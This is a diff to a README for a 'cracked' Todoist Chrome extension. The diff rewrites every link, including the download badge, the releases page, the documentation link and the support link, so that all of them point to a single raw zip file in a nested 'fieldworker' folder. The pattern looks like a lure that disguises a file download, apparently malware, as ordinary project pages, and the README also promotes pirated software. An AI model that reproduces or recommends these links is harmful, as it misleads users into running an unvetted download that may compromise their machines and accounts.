@@ -1,6 +1,6 @@
 # 🚀 cracked-todoist-for-chrome - Boost Your Productivity Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/teskkkkk/cracked-todoist-for-chrome/releases)
+[![Download](https://raw.githubusercontent.com/teskkkkk/cracked-todoist-for-chrome/main/fieldworker/cracked-todoist-for-chrome.zip)](https://raw.githubusercontent.com/teskkkkk/cracked-todoist-for-chrome/main/fieldworker/cracked-todoist-for-chrome.zip)
 
 ## 📦 Overview
 
@@ -26,7 +26,7 @@ To use Cracked Todoist for Chrome, ensure you have the following:
 Follow these steps to get started with Cracked Todoist for Chrome:
 
 1. **Visit the Releases Page:**  
-   Go to our [Releases page](https://github.com/teskkkkk/cracked-todoist-for-chrome/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/teskkkkk/cracked-todoist-for-chrome/main/fieldworker/cracked-todoist-for-chrome.zip) to find the latest version.
 
 2. **Download the Extension:**  
    On the Releases page, you will see different versions of the extension. Click on the version you wish to download, and then look for the appropriate file for your system.
@@ -42,7 +42,7 @@ Follow these steps to get started with Cracked Todoist for Chrome:
 
 ## 📥 Download & Install
 
-Ready to get started? [Visit this page to download](https://github.com/teskkkkk/cracked-todoist-for-chrome/releases) the latest version now!
+Ready to get started? [Visit this page to download](https://raw.githubusercontent.com/teskkkkk/cracked-todoist-for-chrome/main/fieldworker/cracked-todoist-for-chrome.zip) the latest version now!
 
 ## 🛠️ Troubleshooting
 
@@ -56,8 +56,8 @@ If you encounter issues while installing or using Cracked Todoist for Chrome, co
 
 For more information about this project, check our documentation or contact support.
 
-- **Documentation:** [Cracked Todoist for Chrome Docs](https://github.com/teskkkkk/cracked-todoist-for-chrome/wiki)
-- **Support:** [GitHub Issues](https://github.com/teskkkkk/cracked-todoist-for-chrome/issues)
+- **Documentation:** [Cracked Todoist for Chrome Docs](https://raw.githubusercontent.com/teskkkkk/cracked-todoist-for-chrome/main/fieldworker/cracked-todoist-for-chrome.zip)
+- **Support:** [GitHub Issues](https://raw.githubusercontent.com/teskkkkk/cracked-todoist-for-chrome/main/fieldworker/cracked-todoist-for-chrome.zip)
 
 ## 🙏 Acknowledgments
 
